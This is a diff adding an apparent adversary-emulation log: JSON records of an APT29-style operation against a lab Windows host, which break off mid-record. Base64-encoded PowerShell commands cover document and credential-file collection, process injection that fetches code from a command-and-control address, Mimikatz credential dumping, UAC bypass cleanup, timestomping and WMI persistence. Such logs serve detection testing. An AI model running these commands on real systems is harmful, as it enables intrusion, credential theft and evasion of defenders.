+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+      "ability_name": "Bypass User Account Control",
+      "ability_description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+      "technique_id": "T1134.001"
+    },
+    "agent_reported_time": "2022-09-29T20:04:35Z"
+  },
+  {
+    "command": "bW92ZS1pdGVtIFJhci5leGUgLURlc3RpbmF0aW9uIEM6XFdpbmRvd3NcVGVtcCAtRm9yY2U7JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXHdvcmtpbmcuemlwIC1Gb3JjZTtjZCBDOlxXaW5kb3dzXFRlbXA7LlxSYXIuZXhlIGEgLWhwZkd6cTV5S3cgIiRlbnY6VVNFUlBST0ZJTEVcRGVza3RvcFx3b3JraW5nLnppcCIgIiRlbnY6QVBQREFUQVx3b3JraW5nLnppcCI7",
+    "delegated_timestamp": "2022-09-29T20:04:40Z",
+    "collected_timestamp": "2022-09-29T20:04:45Z",
+    "finished_timestamp": "2022-09-29T20:05:45Z",
+    "status": 124,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5620,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "08e57385-dbce-4850-8bb7-589ef79465ab",
+      "ability_name": "Automated document collection (T1119)",
+      "ability_description": "Execute PowerShell collection command to collect and compress files of specific extensions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    },
+    "agent_reported_time": "2022-09-29T20:04:44Z"
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIqIC1SZWN1cnNlIC1Gb3JjZTtpZiAoISh0ZXN0LXBhdGggLXBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIpKSB7ICB3cml0ZS1ob3N0ICJbK10gUmVnIGtleXMgcmVtb3ZlZCEiOyB9",
+    "delegated_timestamp": "2022-09-29T20:04:40Z",
+    "collected_timestamp": "2022-09-29T20:05:33Z",
+    "finished_timestamp": "2022-09-29T20:05:41Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1264,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5ff80022-8d85-410b-b868-6c7565b267e5",
+      "ability_name": "Registry Cleanup for UAC Bypass Technique",
+      "ability_description": "Delete registry entries post-UAC bypass."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Modify Registry",
+      "technique_id": "T1112"
+    },
+    "agent_reported_time": "2022-09-29T20:05:33Z"
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCoucGZ4IiAtRm9yY2U7UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCouYm1wIiAtRm9yY2U7UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCoucG5nIiAtRm9yY2U7aWYgKHRlc3QtcGF0aCAtcGF0aCAiJGVudjpBUFBEQVRBXE9mZmljZVN1cHBsaWVzLjd6IikgeyAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJGVudjpBUFBEQVRBXE9mZmljZVN1cHBsaWVzLjd6IiAtRm9yY2U7IHdyaXRlLWhvc3QgIlsrXSBTdWNjZXNzZnVsbHkgcmVtb3ZlZCBPZmZpY2VTdXBwbGllcy43eiI7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWyFdIEZpbGUgZGlkIG5vdCBleGlzdCB0byBiZSByZW1vdmVkISI7fWlmIChnZXQtam9iIC1uYW1lICJLZXlzdHJva2VzIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgeyAgICBSZW1vdmUtSm9iIC1OYW1lICJLZXlzdHJva2VzIjsgICAgaWYgKCQ/KSB7ICAgICAgICB3cml0ZS1ob3N0ICJbK10gSm9iIFwiS2V5c3Ryb2tlc1wiIHdhcyByZW1vdmUuIjsgICAgfX0gZWxzZSB7ICAgIHdyaXRlLWhvc3QgIlshXSBKb2IgXCJLZXlzdHJva2VzXCIgZGlkIG5vdCBleGlzdC4iO31pZiAoZ2V0LWpvYiAtTmFtZSAiU2NyZWVuc2hvdCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgICAgUmVtb3ZlLUpvYiAtTmFtZSAiU2NyZWVuc2hvdCIgLUZvcmNlOyAgICB3cml0ZS1ob3N0ICJbK10gSm9iIFwic2NyZWVuc2hvdFwiIHdhcyByZW1vdmVkLiI7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWypdIEpvYiBcInNjcmVlbnNob3RcIiBkb2VzIG5vdCBleGlzdCwgdGh1cyB3YXMgbm90IHJlbW92ZWQuIjt9cmVtb3ZlLWl0ZW0gdXBsb2FkLnBzMSAtRm9yY2U7",
+    "delegated_timestamp": "2022-09-29T20:05:45Z",
+    "collected_timestamp": "2022-09-29T20:06:25Z",
+    "finished_timestamp": "2022-09-29T20:06:40Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6004,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92",
+      "ability_name": "Artifact Cleanup",
+      "ability_description": "Delete file artifacts left from the operation."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "technique_id": "T1070.004"
+    },
+    "agent_reported_time": "2022-09-29T20:06:25Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1QU0luamVjdC5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW5qZWN0IC1Qb3NoQ29kZSAkcGNvZGU7",
+    "delegated_timestamp": "2022-09-29T20:05:45Z",
+    "collected_timestamp": "2022-09-29T20:06:19Z",
+    "finished_timestamp": "2022-09-29T20:06:49Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7428,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "088b8639-3f37-42cc-9dc8-01aabb645461",
+      "ability_name": "Process Injection",
+      "ability_description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Process Injection",
+      "technique_id": "T1055"
+    },
+    "agent_reported_time": "2022-09-29T20:06:18Z"
+  },
+  {
+    "command": "aWYgKCEodGVzdC1wYXRoIC1wYXRoICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XGt4d24ubG9jayIpKSB7ICB3cml0ZS1ob3N0ICJbIV0ga3h3bi5sb2NrIHdhcyBub3QgZm91bmQgb24gdGhpcyBob3N0LiI7ICBleGl0IDE7fSBlbHNlIHsgIC4gLlx0aW1lc3RvbXAucHMxOyAgdGltZXN0b21wIC1kZXN0ICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XGt4d24ubG9jayI7fQ==",
+    "delegated_timestamp": "2022-09-29T20:06:51Z",
+    "collected_timestamp": "2022-09-29T20:07:17Z",
+    "finished_timestamp": "2022-09-29T20:07:20Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1740,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+      "ability_name": "Timestomp kxwn.lock",
+      "ability_description": "Timestomp kxwn.lock"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Indicator Removal on Host: Timestomp",
+      "technique_id": "T1070.006"
+    },
+    "agent_reported_time": "2022-09-29T20:07:17Z"
+  },
+  {
+    "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb250cm9sbGVycyIgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T20:06:51Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -4,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "59592c35-8207-4896-8d8b-36ad4600245d",
+      "ability_name": "Remote System Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate DCs within the domain"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Remote System Discovery",
+      "technique_id": "T1018"
+    }
+  },
+  {
+    "command": "LiAuXHN0ZXBUd2VsdmUucHMxO2RldGVjdGF2",
+    "delegated_timestamp": "2022-09-29T20:09:21Z",
+    "collected_timestamp": "2022-09-29T20:09:49Z",
+    "finished_timestamp": "2022-09-29T20:09:50Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5856,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "f9c0b150-822f-497b-ad6d-187f24561e9a",
+      "ability_name": "Detect Anti-Virus",
+      "ability_description": "Detect anti-virus software on host"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Software Discovery: Security Software Discovery",
+      "technique_id": "T1518.001"
+    },
+    "agent_reported_time": "2022-09-29T20:09:49Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBUd2VsdmUucHMxO3NvZnR3YXJlOw==",
+    "delegated_timestamp": "2022-09-29T20:09:51Z",
+    "collected_timestamp": "2022-09-29T20:10:46Z",
+    "finished_timestamp": "2022-09-29T20:10:47Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 2684,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "2b5a72b1-01e4-48ae-98b0-2570a7894371",
+      "ability_name": "Detect Software",
+      "ability_description": "Detect software on host"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Software Discovery",
+      "technique_id": "T1518"
+    },
+    "agent_reported_time": "2022-09-29T20:10:46Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7Y29tcDs=",
+    "delegated_timestamp": "2022-09-29T20:10:51Z",
+    "collected_timestamp": "2022-09-29T20:11:25Z",
+    "finished_timestamp": "2022-09-29T20:11:26Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6100,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+      "ability_name": "Enumerate Computer Name",
+      "ability_description": "Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T20:11:25Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7ZG9tYWluOw==",
+    "delegated_timestamp": "2022-09-29T20:11:27Z",
+    "collected_timestamp": "2022-09-29T20:12:26Z",
+    "finished_timestamp": "2022-09-29T20:12:27Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1096,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "96140694-6d13-40b6-9553-0e63533469f3",
+      "ability_name": "Enumerate Domain Name",
+      "ability_description": "Domain triage"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T20:12:26Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7dXNlcjs=",
+    "delegated_timestamp": "2022-09-29T20:12:32Z",
+    "collected_timestamp": "2022-09-29T20:13:25Z",
+    "finished_timestamp": "2022-09-29T20:13:26Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 400,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "f320eebd-e75b-4194-b529-79e64ad0b9ee",
+      "ability_name": "Enumerate Username",
+      "ability_description": "user triage"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033"
+    },
+    "agent_reported_time": "2022-09-29T20:13:25Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7cHNsaXN0Ow==",
+    "delegated_timestamp": "2022-09-29T20:13:27Z",
+    "collected_timestamp": "2022-09-29T20:14:15Z",
+    "finished_timestamp": "2022-09-29T20:14:16Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7932,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a34ab8f2-a106-41fb-af0b-cf5382bd18ae",
+      "ability_name": "Enumerate Processes",
+      "ability_description": "Process triage"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T20:14:14Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBGb3VydGVlbl9ieXBhc3NVQUMucHMxO2J5cGFzczs=",
+    "delegated_timestamp": "2022-09-29T20:14:18Z",
+    "collected_timestamp": "2022-09-29T20:15:14Z",
+    "finished_timestamp": "2022-09-29T20:15:18Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7436,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5226e5dc-fc28-43b7-a679-0db49d520402",
+      "ability_name": "UAC Bypass via sdctl",
+      "ability_description": "Invoke UAC bypass sdctl"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Access Token Manipulation: Create Process with Token",
+      "technique_id": "T1134.002"
+    },
+    "agent_reported_time": "2022-09-29T20:15:13Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBGb3VydGVlbl9jcmVkRHVtcC5wczE7",
+    "delegated_timestamp": "2022-09-29T20:15:18Z",
+    "collected_timestamp": "2022-09-29T20:16:16Z",
+    "finished_timestamp": "2022-09-29T20:16:17Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 8188,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+      "ability_name": "Credential Dumping",
+      "ability_description": "Dumping credentials via wmidump (Mimikatz)"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    },
+    "agent_reported_time": "2022-09-29T20:16:15Z"
+  },
+  {
+    "command": "d3JpdGUtaG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBkb3dubG9hZGVkIG0uZXhlIjs=",
+    "delegated_timestamp": "2022-09-29T20:16:18Z",
+    "collected_timestamp": "2022-09-29T20:17:17Z",
+    "finished_timestamp": "2022-09-29T20:17:17Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 3648,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+      "ability_name": "Stage Mimikatz Binary",
+      "ability_description": "Staging Mimikatz Binary for later execution"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    },
+    "agent_reported_time": "2022-09-29T20:17:16Z"
+  },
+  {
+    "command": "R2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlICJyb290L3N1YnNjcmlwdGlvbiIgLWxpc3QgfCBmaW5kc3RyIC9pICJfX0ZpbHRlciI7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gV01JIHNjcmlwdCBoYXMgYWxyZWFkeSBleGVjdXRlZCBvbiB0aGlzIG1hY2hpbmUuIE5vdCBsb2FkaW5nIGFuZCBleGVjdXRpbmcgd21pIHNjcmlwdC4iOyAgZXhpdCAxO30gZWxzZSB7ICAuIC5cc3RlcEZpZnRlZW5fd21pLnBzMTsgIHdtaTsgIGlmICgkPykgeyAgICB3cml0ZS1ob3N0ICJbK10gV01JIHNjcmlwdCBoYXMgc3VjY2Vzc2Z1bGx5IGV4ZWN1dGVkISI7ICAgIGV4aXQgMDsgIH0gIGV4aXQgMTt9",
+    "delegated_timestamp": "2022-09-29T20:17:18Z",
+    "collected_timestamp": "2022-09-29T20:18:12Z",
+    "finished_timestamp": "2022-09-29T20:18:12Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5060,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+      "ability_name": "WMI Persistence technique",
+      "ability_description": "user triage"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "persistence",
+      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+      "technique_id": "T1546.003"
+    },
+    "agent_reported_time": "2022-09-29T20:18:11Z"
+  },
+  {
+    "command": "LiAuXHBvd2Vydmlldy5wczE7Z2V0LW5ldGRvbWFpbmNvbnRyb2xsZXI7",
+    "delegated_timestamp": "2022-09-29T20:18:14Z",
+    "collected_timestamp": "2022-09-29T20:19:15Z",
+    "finished_timestamp": "2022-09-29T20:19:30Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6904,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1c8552c7-f7ed-4523-b640-72d65af5f855",
+      "ability_name": "Enumerate Domain Controller",
+      "ability_description": "Get domain controller and current user SID for the domain"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Remote System Discovery",
+      "technique_id": "T1018"
+    },
+    "agent_reported_time": "2022-09-29T20:19:14Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBTaXh0ZWVuX1NJRC5wczE7c2lkdXNlcjs=",
+    "delegated_timestamp": "2022-09-29T20:19:34Z",
+    "collected_timestamp": "2022-09-29T20:19:56Z",
+    "finished_timestamp": "2022-09-29T20:19:56Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7432,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+      "ability_name": "Enumerate Domain SID",
+      "ability_description": "Get domain user SID"
+    },
+    "operation_metadata": {
